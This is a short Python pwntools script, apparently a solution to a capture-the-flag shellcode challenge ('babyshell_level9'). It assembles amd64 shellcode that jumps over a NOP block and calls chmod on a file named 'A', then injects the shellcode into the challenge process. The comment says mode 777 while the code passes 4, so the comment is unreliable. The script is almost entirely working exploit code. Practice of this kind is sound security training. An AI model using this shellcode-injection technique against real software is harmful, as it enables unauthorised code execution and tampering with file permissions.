from pwn import *

context.arch = 'amd64'
#context.log_level = "debug"

p = process('/challenge/babyshell_level9')

shellcode = """
    /*  chmod('A',777) */
    push 0x41
    mov rdi, rsp
    push 4
    pop rsi
    jmp continue
    .rept 10
    nop
    .endr
continue:
    push SYS_chmod /* 0x5a */
    pop rax
    syscall
"""

# Assemble the shellcode
shellcode = asm(shellcode)
print(shellcode)
print(len(shellcode))

p.send(shellcode)

# Interact with the process
p.interactive()